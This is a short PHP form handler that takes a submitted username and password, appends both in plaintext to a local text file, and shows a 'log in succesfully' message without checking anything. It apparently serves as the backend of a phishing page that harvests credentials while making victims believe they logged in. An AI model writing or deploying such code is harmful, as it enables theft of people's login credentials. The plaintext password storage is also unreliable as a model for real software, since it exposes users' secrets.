<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get user input
    $username = htmlspecialchars(trim($_POST['username'])); // Sanitize input
    $password = htmlspecialchars(trim($_POST['password'])); // Sanitize input

    // Prepare the data to save
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

    // Define the file where data will be saved
    $file = "user_data.txt";

    // Open the file in append mode
    $handle = fopen($file, "a");

    // Check if the file opened successfully
    if ($handle) {
        // Write the data to the file
        fwrite($handle, $data);

        // Close the file after writing
        fclose($handle);

        // Inform the user that the data has been saved
       echo "<center> log in succesfully. please refresh this page </center>";
    } else {
        echo "Error: Could not open the file.";
    }
} else {
    echo "Please submit the form.";
}
?>
